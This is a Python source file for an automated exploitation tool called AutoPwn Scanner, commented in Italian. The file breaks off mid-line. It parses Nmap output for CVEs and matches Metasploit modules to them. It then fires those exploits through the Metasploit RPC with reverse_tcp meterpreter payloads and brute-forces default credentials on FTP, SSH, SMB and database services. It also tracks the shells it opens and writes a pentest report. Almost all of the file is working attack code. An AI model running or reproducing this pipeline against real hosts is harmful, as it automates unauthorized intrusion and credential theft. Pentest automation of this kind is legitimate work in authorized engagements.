#!/usr/bin/env python3
"""
logic_mapper.py — AutoPwn Scanner v3.0
════════════════════════════════════════════════════════════════
Modifiche v3:
  1. Correlazione via CVE  (estrae CVE da <script id="vulners">)
  2. Filtro searchsploit preciso  (path /modules/ ufficiale)
  3. Payload dinamico  (Windows vs Linux vs fallback)
  4. Parametri intelligenti  (RPORT reale, TARGETURI, SMB creds)
  5. Exploit Ranking  (Excellent > Great > Good > skip/confirm)
  6. Pipeline a fasi  (auxiliary brute-force prima degli exploit)
  7. SQLite WAL  (sicuro in multithreading)
  8. Moduli Auxiliary  (ssh_login, ftp_login, smb_login)
  9. Report Markdown  (generato a fine pipeline)
 10. Cleanup sessioni  (killall al termine o su segnale)
════════════════════════════════════════════════════════════════
Dipendenze:
  pip install pymetasploit3
"""

import argparse
import configparser
import json
import re
import signal
import sqlite3
import sys
import threading
import time
import xml.etree.ElementTree as ET
from datetime import datetime
from pathlib import Path
from typing import Optional

# ── pymetasploit3 ────────────────────────────────────────────────
try:
    from pymetasploit3.msfrpc import MsfRpcClient
    MSF_AVAILABLE = True
except ImportError:
    print("[WARN] pymetasploit3 not found. MSF features disabled.")
    MSF_AVAILABLE = False

# ════════════════════════════════════════════════════════════════
#  ANSI helpers
# ════════════════════════════════════════════════════════════════
class C:
    R  = "\033[0m"; B  = "\033[1m"; DIM = "\033[2m"
    GR = "\033[92m"; YE = "\033[93m"; RE = "\033[91m"
    CY = "\033[96m"; MA = "\033[95m"

def ok(m):   print(f"{C.GR}[+]{C.R} {m}")
def err(m):  print(f"{C.RE}[-]{C.R} {m}")
def warn(m): print(f"{C.YE}[!]{C.R} {m}")
def info(m): print(f"{C.CY}[*]{C.R} {m}")
def run(m):  print(f"{C.B}[»]{C.R} {m}")

# ════════════════════════════════════════════════════════════════
#  CONFIG
# ════════════════════════════════════════════════════════════════
def _load_config(path: str = "config.ini") -> configparser.ConfigParser:
    cfg = configparser.ConfigParser()
    # Default values matching scanner_runner.cpp
    cfg.read_dict({
        "metasploit": {"msf_password": "change_this_password",
                       "msf_host": "127.0.0.1", "msf_port": "55553"},
        "scanner":    {"output_dir": "./results",
                       "monitor_interval": "5",
                       "post_pipeline_wait": "10"},
        "database":   {"db_path": "./results/scanner.db"},
    })
    if Path(path).exists():
        cfg.read(path)
    else:
        warn(f"{path} not found, using defaults.")
    return cfg

_CFG               = _load_config()

# Robust accessor supporting both old and new keys
MSF_PASSWORD       = _CFG["metasploit"].get("msf_password", _CFG["metasploit"].get("password", "change_this_password"))
MSF_HOST           = _CFG["metasploit"].get("msf_host", _CFG["metasploit"].get("host", "127.0.0.1"))
MSF_PORT           = _CFG["metasploit"].getint("msf_port", _CFG["metasploit"].getint("port", 55553))
DB_PATH            = _CFG["database"].get("db_path", _CFG["database"].get("path", "./results/scanner.db"))

MONITOR_INTERVAL   = _CFG["scanner"].getint("monitor_interval")
POST_PIPELINE_WAIT = _CFG["scanner"].getint("post_pipeline_wait")

# ════════════════════════════════════════════════════════════════
#  EXPLOIT RANKING  — ordine di priorità MSF
# ════════════════════════════════════════════════════════════════
RANK_ORDER = {
    "excellent": 0,
    "great":     1,
    "good":      2,
    "normal":    3,
    "average":   4,
    "low":       5,
    "manual":    6,
}

# Moduli con ranking Low/Average: chiedi conferma prima di lanciare
RISKY_RANKS = {"low", "average", "manual"}

# ════════════════════════════════════════════════════════════════
#  AUXILIARY SERVICE MAP
#  porta → modulo ausiliario di credential check
# ════════════════════════════════════════════════════════════════
AUXILIARY_MAP: dict[int, str] = {
    21:  "auxiliary/scanner/ftp/ftp_login",
    22:  "auxiliary/scanner/ssh/ssh_login",
    23:  "auxiliary/scanner/telnet/telnet_login",
    445: "auxiliary/scanner/smb/smb_login",
    3306:"auxiliary/scanner/mysql/mysql_login",
    5432:"auxiliary/scanner/postgres/postgres_login",
}

# Default credential pairs per brute-force leggero
DEFAULT_CREDS = [
    ("anonymous", ""),
    ("admin",     "admin"),
    ("admin",     "password"),
    ("root",      "root"),
    ("root",      ""),
    ("user",      "user"),
    ("guest",     "guest"),
]

# ════════════════════════════════════════════════════════════════
#  HTTP path detection — usato per TARGETURI
# ════════════════════════════════════════════════════════════════
HTTP_PATH_PATTERNS = [
    (re.compile(r"wordpress", re.I),  "/wordpress/"),
    (re.compile(r"phpmyadmin", re.I), "/phpmyadmin/"),
    (re.compile(r"drupal",     re.I), "/drupal/"),
    (re.compile(r"joomla",     re.I), "/joomla/"),
    (re.compile(r"jenkins",    re.I), "/"),
    (re.compile(r"tomcat",     re.I), "/manager/html"),
    (re.compile(r"struts",     re.I), "/"),
]

# ════════════════════════════════════════════════════════════════
#  MODULE 1 — DATABASE  (WAL enabled)
# ════════════════════════════════════════════════════════════════
class Database:
    def __init__(self, db_path: str = DB_PATH):
        Path(db_path).parent.mkdir(parents=True, exist_ok=True)
        self._db_path = db_path
        self._lock = threading.Lock()
        self._local = threading.local()
        self._initialize_main_connection()
        self._create_tables()
        info(f"DB connected: {db_path}  [WAL mode]")

    def _initialize_main_connection(self):
        conn = sqlite3.connect(self._db_path, check_same_thread=False)
        conn.execute("PRAGMA journal_mode=WAL;")
        conn.execute("PRAGMA synchronous=NORMAL;")
        self._local.conn = conn

    def _conn(self):
        if not hasattr(self._local, 'conn'):
            conn = sqlite3.connect(self._db_path, check_same_thread=False)
            conn.execute("PRAGMA journal_mode=WAL;")
            conn.execute("PRAGMA synchronous=NORMAL;")
            self._local.conn = conn
        return self._local.conn

    def _create_tables(self):
        with self._lock:
            conn = self._conn()
            conn.executescript("""
                CREATE TABLE IF NOT EXISTS Targets (
                    id          INTEGER PRIMARY KEY AUTOINCREMENT,
                    ip          TEXT NOT NULL,
                    hostname    TEXT,
                    os_info     TEXT,
                    arch        TEXT,
                    scan_time   TEXT NOT NULL
                );

                CREATE TABLE IF NOT EXISTS Vulnerabilities (
                    id           INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id    INTEGER REFERENCES Targets(id),
                    port         INTEGER,
                    protocol     TEXT,
                    service      TEXT,
                    version      TEXT,
                    cve_ids      TEXT,
                    exploit_name TEXT,
                    exploit_path TEXT,
                    msf_module   TEXT,
                    msf_rank     TEXT,
                    has_msf      INTEGER DEFAULT 0,
                    found_time   TEXT NOT NULL
                );

                CREATE TABLE IF NOT EXISTS Credentials (
                    id          INTEGER PRIMARY KEY AUTOINCREMENT,
                    target_id   INTEGER REFERENCES Targets(id),
                    port        INTEGER,
                    service     TEXT,
                    username    TEXT,
                    password    TEXT,
                    found_time  TEXT NOT NULL
                );

                CREATE TABLE IF NOT EXISTS Exploits_Found (
                    id           INTEGER PRIMARY KEY AUTOINCREMENT,
                    vuln_id      INTEGER REFERENCES Vulnerabilities(id),
                    msf_module   TEXT,
                    rhost        TEXT,
                    rport        INTEGER,
                    payload_used TEXT,
                    session_id   INTEGER,
                    session_user TEXT,
                    success      INTEGER DEFAULT 0,
                    error_msg    TEXT,
                    attempt_time TEXT NOT NULL
                );
            """)
            conn.commit()

    def _now(self) -> str:
        return datetime.now().isoformat()

    def insert_target(self, ip: str, hostname: str = "",
                      os_info: str = "", arch: str = "") -> int:
        with self._lock:
            conn = self._conn()
            cur = conn.cursor()
            cur.execute(
                "INSERT INTO Targets (ip,hostname,os_info,arch,scan_time) "
                "VALUES (?,?,?,?,?)",
                (ip, hostname, os_info, arch, self._now()))
            conn.commit()
            return cur.lastrowid

    def insert_vulnerability(self, target_id: int, port: int,
                              protocol: str, service: str, version: str,
                              cve_ids: str, exploit_name: str,
                              exploit_path: str, msf_module: str,
                              msf_rank: str, has_msf: bool) -> int:
        with self._lock:
            conn = self._conn()
            cur = conn.cursor()
            cur.execute(
                "INSERT INTO Vulnerabilities "
                "(target_id,port,protocol,service,version,cve_ids,"
                " exploit_name,exploit_path,msf_module,msf_rank,"
                " has_msf,found_time) "
                "VALUES (?,?,?,?,?,?,?,?,?,?,?,?)",
                (target_id, port, protocol, service, version, cve_ids,
                 exploit_name, exploit_path, msf_module, msf_rank,
                 int(has_msf), self._now()))
            conn.commit()
            return cur.lastrowid

    def insert_credential(self, target_id: int, port: int,
                          service: str, username: str, password: str) -> int:
        with self._lock:
            conn = self._conn()
            cur = conn.cursor()
            cur.execute(
                "INSERT INTO Credentials "
                "(target_id,port,service,username,password,found_time) "
                "VALUES (?,?,?,?,?,?)",
                (target_id, port, service, username, password, self._now()))
            conn.commit()
            return cur.lastrowid

    def insert_exploit_attempt(self, vuln_id: Optional[int],
                                msf_module: str, rhost: str, rport: int,
                                payload_used: str, session_id: Optional[int],
                                session_user: str, success: bool,
                                error_msg: str = "") -> int:
        with self._lock:
            conn = self._conn()
            cur = conn.cursor()
            cur.execute(
                "INSERT INTO Exploits_Found "
                "(vuln_id,msf_module,rhost,rport,payload_used,"
                " session_id,session_user,success,error_msg,attempt_time) "
                "VALUES (?,?,?,?,?,?,?,?,?,?)",
                (vuln_id, msf_module, rhost, rport, payload_used,
                 session_id, session_user, int(success), error_msg,
                 self._now()))
            conn.commit()
            return cur.lastrowid

    def get_credentials(self, target_id: int, port: int) -> list[dict]:
        """Restituisce le credenziali trovate per un target/porta."""
        with self._lock:
            conn = self._conn()
            cur = conn.cursor()
            cur.execute(
                "SELECT username, password FROM Credentials "
                "WHERE target_id=? AND port=?",
                (target_id, port))
            return [{"username": r[0], "password": r[1]}
                    for r in cur.fetchall()]

    def close(self):
        if hasattr(self._local, 'conn'):
            self._local.conn.close()
            del self._local.conn


# ════════════════════════════════════════════════════════════════
#  MODULE 2 — NMAP XML PARSER  (con CVE extraction)
# ════════════════════════════════════════════════════════════════
class NmapParser:
    """
    Estrae da ogni porta aperta:
      - service, version, product
      - CVE IDs dallo script vulners  (<script id="vulners">)
      - Percorsi HTTP rilevati da http-enum / altri script
    """

    _CVE_RE = re.compile(r"CVE-\d{4}-\d{4,7}", re.I)

    def __init__(self, xml_path: str):
        self.xml_path = xml_path

    def parse(self) -> list[dict]:
        hosts = []
        try:
            tree = ET.parse(self.xml_path)
            root = tree.getroot()
        except (ET.ParseError, FileNotFoundError) as e:
            err(f"XML parse error: {e}")
            return hosts

        for host_el in root.findall("host"):
            state_el = host_el.find("status")
            if state_el is None or state_el.get("state") != "up":
                continue

            ip = ""
            for addr in host_el.findall("address"):
                if addr.get("addrtype") == "ipv4":
                    ip = addr.get("addr", ""); break

            hostname = ""
            hn_el = host_el.find("hostnames/hostname")
            if hn_el is not None:
                hostname = hn_el.get("name", "")

            # OS detection
            os_info = ""; arch = ""
            os_el = host_el.find("os/osmatch")
            if os_el is not None:
                os_info = os_el.get("name", "")
                # Cerca arch nei dettagli OS
                for osc in host_el.findall("os/osmatch/osclass"):
                    arch = osc.get("type", "")
                    break

            ports = []
            for port_el in host_el.findall("ports/port"):
                st = port_el.find("state")
                if st is None or st.get("state") != "open":
                    continue

                port_num = int(port_el.get("portid", 0))
                protocol = port_el.get("protocol", "tcp")

                svc_el  = port_el.find("service")
                service = ""; version = ""; product = ""
                if svc_el is not None:
                    service = svc_el.get("name", "")
                    product = svc_el.get("product", "")
                    ver     = svc_el.get("version", "")
                    version = f"{product} {ver}".strip()

                # ── CVE extraction dallo script vulners ──────────
                cves: list[str] = []
                http_paths: list[str] = []

                for script_el in port_el.findall("script"):
                    sid = script_el.get("id", "")

                    if sid == "vulners":
                        output = script_el.get("output", "")
                        cves   = list(dict.fromkeys(
                            self._CVE_RE.findall(output)))  # unique, ordered

                    if sid in ("http-enum", "http-title"):
                        output = script_el.get("output", "")
                        # Estrai percorsi tipo /wordpress/, /phpmyadmin/
                        paths = re.findall(r'(/[\w\-./]+/)', output)
                        http_paths.extend(paths)

                ports.append({
                    "port":       port_num,
                    "protocol":   protocol,
                    "service":    service,
                    "version":    version,
                    "product":    product,
                    "cves":       cves,
                    "http_paths": list(dict.fromkeys(http_paths)),
                })

            if ip:
                hosts.append({
                    "ip":       ip,
                    "hostname": hostname,
                    "os":       os_info,
                    "arch":     arch,
                    "ports":    ports,
                })

        info(f"Hosts found: {len(hosts)}")
        return hosts


# ════════════════════════════════════════════════════════════════
#  MODULE 3 — SEARCHSPLOIT FILTER  (CVE-based, no falsi positivi)
# ════════════════════════════════════════════════════════════════
class SearchsploitFilter:
    """
    Filtra i risultati di searchsploit usando:
      1. Path ufficiale /modules/ di Metasploit Framework
         (esclude exploit di terze parti che menzionano solo MSF)
      2. Match CVE: se l'exploit riporta un CVE presente nel vulners
         output di Nmap, la corrispondenza è scientifica.
    """

    _CVE_RE = re.compile(r"CVE-\d{4}-\d{4,7}", re.I)
    # Percorso ufficiale moduli MSF
    _MSF_PATH_RE = re.compile(
        r"/(usr/share/metasploit-framework|metasploit-framework)"
        r"/modules/(exploits|auxiliary|post)/",
        re.I
    )

    def __init__(self, json_path: str):
        self.json_path = json_path
        self._data = self._load()

    def _load(self) -> dict:
        try:
            with open(self.json_path) as f:
                return json.load(f)
        except (FileNotFoundError, json.JSONDecodeError) as e:
            warn(f"Searchsploit JSON error: {e}")
            return {}

    def _extract_cves(self, title: str, path: str) -> list[str]:
        return list(dict.fromkeys(
            self._CVE_RE.findall(title + " " + path)))

    def is_official_msf(self, path: str) -> bool:
        """True solo se il path punta al tree ufficiale di MSF."""
        return bool(self._MSF_PATH_RE.search(path))

    def get_msf_exploits(self,
                          port_cves: Optional[list[str]] = None
                          ) -> list[dict]:
        """
        Restituisce exploit MSF ufficiali.
        Se port_cves è fornito, privilegia (o filtra) per CVE match.
        """
        results = []
        port_cve_set = set(c.upper() for c in (port_cves or []))

        for ip, exploits in self._data.items():
            if not isinstance(exploits, list):
                continue
            for ex in exploits:
                path  = ex.get("Path",  "")
                title = ex.get("Title", "")
                etype = ex.get("Type",  "")

                # Criterio 1: path nel tree ufficiale MSF
                if not self.is_official_msf(path):
                    continue

                ex_cves    = self._extract_cves(title, path)
                cve_match  = bool(port_cve_set &
                                  set(c.upper() for c in ex_cves))

                results.append({
                    "ip":         ip,
                    "title":      title,
                    "path":       path,
                    "type":       etype,
                    "cves":       ex_cves,
                    "cve_match":  cve_match,  # True = match scientifico
                })

        # Ordina: prima quelli con CVE match diretto
        results.sort(key=lambda x: (0 if x["cve_match"] else 1))
        info(f"Official MSF exploits found: {len(results)} "
             f"({sum(1 for r in results if r['cve_match'])} CVE-matched)")
        return results

    def get_all_exploits(self) -> list[dict]:
        results = []
        for ip, exploits in self._data.items():
            if not isinstance(exploits, list):
                continue
            for ex in exploits:
                results.append({
                    "ip":    ip,
                    "title": ex.get("Title", ""),
                    "path":  ex.get("Path",  ""),
                    "type":  ex.get("Type",  ""),
                    "cves":  self._extract_cves(
                        ex.get("Title",""), ex.get("Path","")),
                })
        return results


# ════════════════════════════════════════════════════════════════
#  MODULE 4 — METASPLOIT MANAGER  (ranking + smart params + payload)
# ════════════════════════════════════════════════════════════════
class MetasploitManager:
    """
    Gestisce la connessione RPC e l'esecuzione degli exploit con:
      - Payload dinamico basato su OS rilevato
      - Parametri intelligenti (RPORT reale, TARGETURI)
      - Ranking-based prioritization
      - Ricerca moduli per CVE tramite API nativa MSF
    """

    def __init__(self, password: str = MSF_PASSWORD,
                 host: str = MSF_HOST, port: int = MSF_PORT):
        self.client: Optional[MsfRpcClient] = None
        if not MSF_AVAILABLE:
            warn("pymetasploit3 unavailable, MSF disabled.")
            return
        try:
            self.client = MsfRpcClient(password, server=host, port=port)
            ok(f"Connected to msfrpcd at {host}:{port}")
        except Exception as e:
            err(f"MSF connection failed: {e}")

    def is_connected(self) -> bool:
        return self.client is not None

    # ── Ricerca moduli per CVE tramite API MSF ───────────────────
    def search_by_cve(self, cve_id: str) -> list[str]:
        """
        Interroga l'API MSF per trovare moduli che referenziano un CVE.
        Restituisce lista di module path (es. exploit/unix/ftp/vsftpd_234_backdoor).
        """
        if not self.is_connected():
            return []
        try:
            results = self.client.modules.search(cve_id)
            modules = []
            for r in results:
                fullname = r.get("fullname", "")
                if fullname:
                    modules.append(fullname)
            return modules
        except Exception as e:
            warn(f"MSF CVE search failed ({cve_id}): {e}")
            return []

    # ── Informazioni e ranking di un modulo ─────────────────────
    def get_module_info(self, mtype: str, mname: str) -> dict:
        """Restituisce info del modulo incluso il ranking."""
        if not self.is_connected():
            return {}
        try:
            return self.client.modules.info(mtype, mname)
        except Exception:
            return {}

    def get_rank(self, module_path: str) -> str:
        """Restituisce il ranking normalizzato (lowercase)."""
        parts = module_path.split("/", 1)
        if len(parts) < 2:
            return "normal"
        mtype = parts[0]
        mname = parts[1]
        info_data = self.get_module_info(mtype, mname)
        return str(info_data.get("rank", "normal")).lower()

    # ── Conversione path searchsploit → nome modulo MSF ─────────
    def path_to_module(self, exploit_path: str) -> Optional[str]:
        if "modules/" not in exploit_path:
            return None
        after = exploit_path.split("modules/", 1)[1]
        return after.replace(".rb", "").strip()

    # ── Selezione payload dinamica ───────────────────────────────
    def select_payload(self, os_info: str, arch: str) -> str:
        """
        Sceglie il payload in base all'OS e all'architettura rilevati da Nmap.
        Priorità: Meterpreter staged 64-bit > 32-bit > generico.
        """
        os_lo = (os_info + " " + arch).lower()

        if "windows" in os_lo:
            if "64" in os_lo or "x86_64" in os_lo or "amd64" in os_lo:
                return "windows/x64/meterpreter/reverse_tcp"
            return "windows/meterpreter/reverse_tcp"

        if any(k in os_lo for k in ("linux", "unix", "ubuntu",
                                    "debian", "centos", "fedora")):
            if "64" in os_lo or "x86_64" in os_lo:
                return "linux/x64/meterpreter/reverse_tcp"
            return "linux/x86/meterpreter/reverse_tcp"

        if "android" in os_lo:
            return "android/meterpreter/reverse_tcp"

        if "macos" in os_lo or "darwin" in os_lo or "osx" in os_lo:
            return "osx/x64/meterpreter/reverse_tcp"

        # Fallback generico
        return "generic/shell_reverse_tcp"

    # ── Parametri intelligenti per il modulo ────────────────────
    def smart_params(self, exploit_obj, module_path: str,
                     rhost: str, rport: int,
                     http_paths: list[str],
                     credentials: list[dict]) -> dict:
        """
        Imposta RHOST, RPORT reale e parametri aggiuntivi
        basandosi sul tipo di modulo.
        Restituisce dict dei parametri impostati (per logging).
        """
        params = {}

        exploit_obj["RHOSTS"] = rhost
        params["RHOSTS"] = rhost

        # RPORT: usa la porta realmente aperta su Nmap
        if rport:
            try:
                exploit_obj["RPORT"] = rport
                params["RPORT"] = rport
            except Exception:
                pass  # alcuni moduli non accettano RPORT esplicito

        # TARGETURI per moduli web
        if "multi/http" in module_path or "/http/" in module_path:
            uri = self._detect_uri(module_path, http_paths)
            if uri:
                try:
                    exploit_obj["TARGETURI"] = uri
                    params["TARGETURI"] = uri
                except Exception:
                    pass

        # Credenziali per moduli che le richiedono
        if credentials:
            cred = credentials[0]
            for param in ("USERNAME", "SMBUser", "FTPUSER"):
                try:
                    exploit_obj[param] = cred["username"]
                    params[param] = cred["username"]
                    break
                except Exception:
                    continue
            for param in ("PASSWORD", "SMBPass", "FTPPASS"):
                try:
                    exploit_obj[param] = cred["password"]
                    params[param] = cred["password"]
                    break
                except Exception:
                    continue

        return params

    def _detect_uri(self, module_path: str,
                    http_paths: list[str]) -> Optional[str]:
        """Tenta di rilevare il TARGETURI corretto."""
        # Match dall'output di http-enum
        for path in http_paths:
            for pattern, uri in HTTP_PATH_PATTERNS:
                if pattern.search(path):
                    return uri

        # Match dal nome del modulo
        for pattern, uri in HTTP_PATH_PATTERNS:
            if pattern.search(module_path):
                return uri

        return None

    # ── Esecuzione exploit ───────────────────────────────────────
    def run_exploit(self, module_path: str, rhost: str, rport: int,
                    os_info: str = "", arch: str = "",
                    http_paths: Optional[list[str]] = None,
                    credentials: Optional[list[dict]] = None,
                    ) -> dict:
        """
        Esegue un exploit con payload dinamico e parametri smart.
        Restituisce { success, session_id, session_user,
                      payload_used, error, rank }.
        """
        if not self.is_connected():
            return {"success": False, "session_id": None,
                    "session_user": "", "payload_used": "",
                    "error": "Not connected", "rank": "unknown"}

        rank = self.get_rank(module_path)
        payload_name = self.select_payload(os_info, arch)

        try:
            # Separa tipo e nome modulo
            parts = module_path.split("/", 1)
            mtype = parts[0] if len(parts) == 2 else "exploit"
            mname = parts[1] if len(parts) == 2 else module_path

            exploit = self.client.modules.use(mtype, mname)
            payload = self.client.modules.use("payload", payload_name)

            set_params = self.smart_params(
                exploit, module_path, rhost, rport,
                http_paths or [], credentials or [])

            run(f"Launching {module_path} → {rhost}:{rport}")
            info(f"  Payload : {payload_name}")
            info(f"  Rank    : {rank}")
            info(f"  Params  : {set_params}")

            job_id = exploit.execute(payload=payload)
            info(f"  Job ID  : {job_id}")

            # Attendi e controlla sessioni aperte
            time.sleep(8)
            sessions = self.client.sessions.list
            new_sess = {
                sid: s for sid, s in sessions.items()
                if s.get("via_exploit", "").endswith(mname)
                and s.get("target_host") == rhost
            }

            if new_sess:
                sid  = list(new_sess.keys())[0]
                user = new_sess[sid].get("username", "unknown")
                ok(f"Session opened: {sid}  user={user}")
                return {"success": True, "session_id": int(sid),
                        "session_user": user, "payload_used": payload_name,
                        "error": None, "rank": rank}

            warn("No session opened.")
            return {"success": False, "session_id": None,
                    "session_user": "", "payload_used": payload_name,
                    "error": "no session", "rank": rank}

        except Exception as e:
            err(f"Exploit error: {e}")
            return {"success": False, "session_id": None,
                    "session_user": "", "payload_used": payload_name,
                    "error": str(e), "rank": rank}

    # ── Auxiliary brute-force ────────────────────────────────────
    def run_auxiliary(self, module_path: str,
                      rhost: str, rport: int,
                      creds: list[tuple[str, str]]) -> list[dict]:
        """
        Esegue un modulo auxiliary di credential check.
        Restituisce lista di credenziali valide trovate.
        """
        if not self.is_connected():
            return []

        found: list[dict] = []
        try:
            parts = module_path.split("/", 1)
            mod = self.client.modules.use(parts[0], parts[1])
            mod["RHOSTS"] = rhost
            try: mod["RPORT"] = rport
            except Exception: pass

            for username, password in creds:
                try:
                    mod["USERNAME"] = username
                    mod["PASSWORD"] = password
                    mod.execute()
                    time.sleep(2)

                    # Controlla se ci sono loot o credenziali salvate
                    # (semplificato: monitora sessioni per FTP/SSH anon)
                    sessions = self.client.sessions.list
                    new_s = {sid: s for sid, s in sessions.items()
                             if s.get("target_host") == rhost}
                    if new_s:
                        ok(f"  ✓ Credential works: {username}:{password}")
                        found.append({"username": username,
                                      "password": password})
                        # Ferma al primo successo per non crashare il servizio
                        break

                except Exception:
                    continue

        except Exception as e:
            warn(f"Auxiliary error ({module_path}): {e}")

        return found

    # ── Cleanup: chiudi tutte le sessioni della sessione corrente ─
    def kill_all_sessions(self):
        """Chiude tutte le sessioni attive su msfrpcd."""
        if not self.is_connected():
            return
        try:
            sessions = self.client.sessions.list
            if not sessions:
                info("No sessions to clean up.")
                return
            for sid in list(sessions.keys()):
                try:
                    self.client.sessions.session(str(sid)).stop()
                    info(f"  Closed session {sid}")
                except Exception:
                    pass
            ok("All sessions cleaned up.")
        except Exception as e:
            warn(f"Cleanup error: {e}")


# ════════════════════════════════════════════════════════════════
#  MODULE 5 — METERPRETER MONITOR  (invariato, con WAL-safe DB)
# ════════════════════════════════════════════════════════════════
class MeterpreterMonitor:
    _GR = "\033[92m"; _YE = "\033[93m"; _CY = "\033[96m"
    _B  = "\033[1m";  _R  = "\033[0m"

    def __init__(self, msf_client, db: Database, interval: int = 5):
        self.client      = msf_client
        self.db          = db
        self.interval    = interval
        self._known_sids: set[str] = set()
        self._stop_event = threading.Event()
        self._thread     = threading.Thread(
            target=self._poll_loop, name="MeterpreterMonitor", daemon=True)

    def start(self):
        try:
            self._known_sids = set(
                str(k) for k in self.client.sessions.list.keys())
        except Exception:
            self._known_sids = set()
        self._thread.start()
        info(f"[MONITOR] Started. Polling every {self.interval}s.")

    def stop(self):
        self._stop_event.set()
        self._thread.join(timeout=self.interval + 2)
        info("[MONITOR] Stopped.")

    def _poll_loop(self):
        while not self._stop_event.is_set():
            try:
                self._check()
            except Exception as e:
                pass  # resiliente
            self._stop_event.wait(self.interval)

    def _check(self):
        sessions = self.client.sessions.list
        current  = set(str(k) for k in sessions.keys())
        for sid in current - self._known_sids:
            info_d = sessions.get(sid, {})
            self._notify(sid, info_d)
            self._persist(sid, info_d)
        self._known_sids = current

    def _notify(self, sid: str, info_d: dict):
        stype    = info_d.get("type",        "unknown").lower()
        rhost    = info_d.get("target_host", "?")
        via_mod  = info_d.get("via_exploit", "?")
        username = info_d.get("username",    "?")
        platform = info_d.get("platform",    "?")
        arch     = info_d.get("arch",        "?")
        ts       = datetime.now().strftime("%H:%M:%S")

        if "meterpreter" in stype:
            icon, label, col = "★", "METERPRETER SESSION", self._GR
        elif "shell" in stype:
            icon, label, col = "✓", "SHELL SESSION",       self._YE
        else:
            icon, label, col = "~", "NEW SESSION",          self._CY

        print(
            f"\n{col}{self._B}"
            f"╔══════════════════════════════════════════════╗\n"
            f"║  {icon}  {label:<40}║\n"
            f"╠══════════════════════════════════════════════╣\n"
            f"║  Session ID : {sid:<31}║\n"
            f"║  Target     : {rhost:<31}║\n"
            f"║  Type       : {stype:<31}║\n"
            f"║  Platform   : {platform}/{arch:<26}║\n"
            f"║  User       : {username:<31}║\n"
            f"║  Module     : {via_mod[:31]:<31}║\n"
            f"║  Time       : {ts:<31}║\n"
            f"╚══════════════════════════════════════════════╝"
            f"{self._R}\n", flush=True)

    def _persist(self, sid: str, info_d: dict):
        rhost   = info_d.get("target_host", "")
        via_mod = info_d.get("via_exploit", "")
        stype   = info_d.get("type", "unknown")
        user    = info_d.get("username", "")
        try:
            conn = self.db._conn()
            cur = conn.cursor()
            cur.execute(
                "SELECT id FROM Exploits_Found "
                "WHERE rhost=? AND session_id IS NULL "
                "ORDER BY attempt_time DESC LIMIT 1", (rhost,))
            row = cur.fetchone()
            if row:
                with self.db._lock:
                    conn.execute(
                        "UPDATE Exploits_Found "
                        "SET session_id=?,session_user=?,success=1,"
                        "attempt_time=? WHERE id=?",
                        (int(sid), user, datetime.now().isoformat(), row[0]))
                    conn.commit()
            else:
                self.db.insert_exploit_attempt(
                    None, via_mod or f"[monitor/{stype}]",
                    rhost, 0, "", int(sid), user, True)
        except Exception as e:
            warn(f"[MONITOR] DB error: {e}")


# ════════════════════════════════════════════════════════════════
#  MODULE 6 — MARKDOWN REPORT GENERATOR
# ════════════════════════════════════════════════════════════════
class MarkdownReporter:
    """
    Genera un report strutturato in Markdown dal database SQLite.
    Compatibile con Obsidian, Notion, GitHub, e qualsiasi viewer MD.
    """

    def __init__(self, db: Database, output_path: str):
        self.db          = db
        self.output_path = output_path

    def generate(self) -> str:
        path = self.output_path
        Path(path).parent.mkdir(parents=True, exist_ok=True)

        with self.db._lock:
            conn = self.db._conn()
            cur = conn.cursor()

            # Targets
            cur.execute("SELECT * FROM Targets ORDER BY scan_time")
            targets = cur.fetchall()
            t_cols  = [d[0] for d in cur.description]

            # Vulnerabilities
            cur.execute("""
                SELECT v.*, t.ip FROM Vulnerabilities v
                JOIN Targets t ON v.target_id=t.id
                ORDER BY t.ip, v.port
            """)
            vulns  = cur.fetchall()
            v_cols = [d[0] for d in cur.description]

            # Credentials
            cur.execute("""
                SELECT c.*, t.ip FROM Credentials c
                JOIN Targets t ON c.target_id=t.id
                ORDER BY t.ip, c.port
            """)
            creds  = cur.fetchall()

            # Exploits
            cur.execute("""
                SELECT e.*, v.cve_ids FROM Exploits_Found e
                LEFT JOIN Vulnerabilities v ON e.vuln_id=v.id
                ORDER BY e.attempt_time
            """)
            exploits = cur.fetchall()
            e_cols   = [d[0] for d in cur.description]

        lines: list[str] = []
        ts = datetime.now().strftime("%Y-%m-%d %H:%M:%S")

        # ── Header ──────────────────────────────────────────────
        lines += [
            "# 🔍 AutoPwn Scanner — Penetration Test Report",
            "",
            f"> **Generated:** {ts}  ",
            f"> **Targets scanned:** {len(targets)}  ",
            f"> **Tool version:** AutoPwn Scanner v3.0",
            "",
            "---", "",
            "## Table of Contents",
            "",
            "1. [Executive Summary](#executive-summary)",
            "2. [Scanned Hosts](#scanned-hosts)",
            "3. [Open Ports & Vulnerabilities](#open-ports--vulnerabilities)",
            "4. [Credentials Found](#credentials-found)",
            "5. [Exploitation Attempts](#exploitation-attempts)",
            "6. [Successful Sessions](#successful-sessions)",
            "",
            "---", "",
        ]

        # ── Executive Summary ────────────────────────────────────
        n_vuln    = len(vulns)
        n_msf     = sum(1 for v in vulns if v[v_cols.index("has_msf")])
        n_success = sum(1 for e in exploits
                        if e[e_cols.index("success")])
        n_creds   = len(creds)

        lines += [
            "## Executive Summary", "",
            "| Metric | Value |",
            "|--------|-------|",
            f"| Hosts scanned       | {len(targets)} |",
            f"| Vulnerabilities     | {n_vuln} |",
            f"| MSF-ready exploits  | {n_msf} |",
            f"| Credentials found   | {n_creds} |",
            f"| Exploit attempts    | {len(exploits)} |",
            f"| Successful sessions | {n_success} |",
            "", "---", "",
        ]

        # ── Scanned Hosts ────────────────────────────────────────
        lines += ["## Scanned Hosts", ""]
        lines += ["| IP | Hostname | OS | Arch | Scan Time |",
                  "|----|----------|----|------|-----------|"]
        for t in targets:
            td = dict(zip(t_cols, t))
            lines.append(
                f"| `{td['ip']}` | {td['hostname'] or '—'} "
                f"| {td['os_info'] or '—'} | {td['arch'] or '—'} "
                f"| {td['scan_time'][:19]} |")
        lines += ["", "---", ""]

        # ── Vulnerabilities ──────────────────────────────────────
        lines += ["## Open Ports & Vulnerabilities", ""]
        current_ip = None
        for v in vulns:
            vd  = dict(zip(v_cols, v))
            ip  = vd.get("ip", "?")
            if ip != current_ip:
                current_ip = ip
                lines += [f"### Host: `{ip}`", ""]
                lines += ["| Port | Service | Version | CVEs | Exploit | MSF? | Rank |",
                           "|------|---------|---------|------|---------|------|------|"]

            msf_badge = "✅" if vd["has_msf"] else "❌"
            rank_str  = vd.get("msf_rank") or "—"
            cves_str  = vd.get("cve_ids") or "—"
            lines.append(
                f"| {vd['port']}/{vd['protocol']} "
